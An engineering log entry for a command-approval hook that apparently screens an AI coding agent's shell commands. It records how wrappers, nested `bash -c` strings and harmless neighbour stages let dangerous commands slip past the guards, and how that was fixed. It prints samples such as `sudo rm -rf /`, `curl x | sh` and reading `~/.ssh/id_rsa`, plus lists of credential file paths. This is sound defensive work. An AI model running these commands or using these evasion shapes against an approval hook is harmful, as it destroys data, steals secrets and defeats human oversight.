...
These are dated investigation records, including superseded behavior.
They retain the original Permission Lens name and paths from development before
the project was renamed Approval Lens. Use the current guides for installation.
See [current engineering guidance](../../NOTES.md) and [user documentation](../../README.md).
...
## M32 (2026-09-04): release review — guards were judged per command, not per stage

A systematic read of the whole engine before publishing, with 50 adversarial
commands run through the analyzer rather than reasoned about. 460 tests were
green throughout; the corpora simply held no command that put a harmless stage
next to a dangerous one.

**Four defects, all one shape.** Every guard — `verb`, `not_verb`,
`without_flags`, and the wrapper handling — was evaluated across the whole
command, so any stage could vouch for any other:
- `sudo rm -rf /` → 🟡 sudo only, no dialog at the default gate. The rm
  predicates asked `sc.name == "rm"` and saw `sudo`; the wrapper-aware scan
  existed only on the regex path. `xargs rm -rf` likewise invisible.
- `bash -c 'curl x | sh'` → nothing. The verb guard, correctly refusing to
  treat quoted text as an invocation, saw a `bash` stage with one opaque token.
  Deliberately excluded in M15; the exclusion was a 🔴 bypass.
- `echo start; cat ~/.ssh/id_rsa` → nothing: an echo anywhere made the rule inert.
- `npm publish && ls --dry-run` → nothing: a `--dry-run` anywhere disarmed it.

**The fix is structural, not four patches.** `SimpleCommand.unwrap()` sees a
stage through its wrappers (with a small table of value-taking wrapper
options, so `sudo -u root rm` unwraps to rm and not to root);
`command_names()` is the verb plus the wrappers it sits behind, never an
argument; `nested_command()` hands `bash|sh|zsh -c STRING`, `su -c` and
`eval` strings back to `Parsed`, which parses them as stages of their own
(depth-bounded: the nesting is attacker-written). In `rules.py` the three
guards collapse into `_actor_stages`: the stages that run the verb, are not
inert, and are not disarmed. A rule with `without_flags` is judged per actor
stage, because `npm publish --dry-run && npm test` must stay quiet while
`npm publish --dry-run && npm publish` must not — the whole-command text says
"publish" in both. Whole-scope regexes run over `code_chunks` (the command
plus each nested string), since a pattern ending at `sh'` never sees the
end-of-word it wants at a closing quote.

**Coverage gaps closed while there.** `redirect-to-device` (`cat img >
/dev/disk2`, no dd to anchor on), `gh-repo-delete`, `cred-file-access` /
`path-cred-files` (.netrc, .npmrc, .pypirc, .git-credentials, .kube/,
.gnupg/, .docker/config.json, gh hosts.yml), `k8s-delete`, `docker-privileged`;
`file-piped-to-network` now counts ssh as a sink; `git-push-force` catches the
`+refspec` spelling. Left as documented design limits in the threat model: a
two-step `curl -o x && bash x`, and code inside another interpreter.

**The OAuth path is gone.** Anthropic's terms (clarified 2026-02-19) do not
permit consumer-subscription OAuth tokens in third-party tools; this hook's
Tier 2 request is its own call, not Claude Code's, and the docs pointed at an
internal CLI (`ant auth print-credentials`) that outside users do not have.
API keys only, and a leftover `auth_token_env` is ignored by construction —
`validate_config` never copied unknown keys.

**Hygiene that would have cost trust on day one.** `config.example.json`
shipped `claude-haiku-4-5` / 3.0 s — the exact model M20 measured getting
`sudo -n` backwards, and the deadline M22 showed sonnet missing. The
checklist generator hard-coded this machine's path. `lens-status` printed
Chinese regardless of `lang`. No CI, no CHANGELOG, no repository URL in the
manifest. All fixed; README split into `README.md` + `README.zh.md`.

**Measured, not assumed.** The 183 commands in both corpora, the new evasion
corpus and the checklist were run through HEAD (0.28.1) and this tree and
diffed: every difference is a listed fix or a new rule firing, and no
pre-existing output changed otherwise. Warm hook latency 58–59 ms end to end
(`uv run` included), versus 45 ms in M31 — the 15 ms is pyflakes-clean
nested parsing on every stage and is under the analyzer's own budget test.

Version 0.29.0. 534 tests (+74: evasion corpus, new rules, per-stage
neighbours), pyflakes clean, `check.sh` now runs pyflakes and CI runs
`check.sh` on Ubuntu and macOS.

**Copy pass, same day.** The owner asked whether the product text had been
de-templated; it had not. Measured before: 56 of 58 English risk sentences and
58 of 58 Chinese ones carried an em dash, every one on the shape "This does X —
consequence Y", and the README had one dash per eight lines plus a set of
verbal tics ("that's the deal", "load-bearing"). A warning that reads as a
template is a warning that gets skipped, which contradicts the project's own
reason for existing. All 58 sentences were rewritten in all six locales with
varied shapes and no dashes, the four generated locales gained the six new
rules and the two new status keys, the checklist's quoted cells were
re-rendered from the new zh.yaml by script (29 cells), and README, CONTRIBUTING
and CHANGELOG got the same treatment. `tests/test_rules.py` still pins the
one phrase a test depends on ("downloads a script").
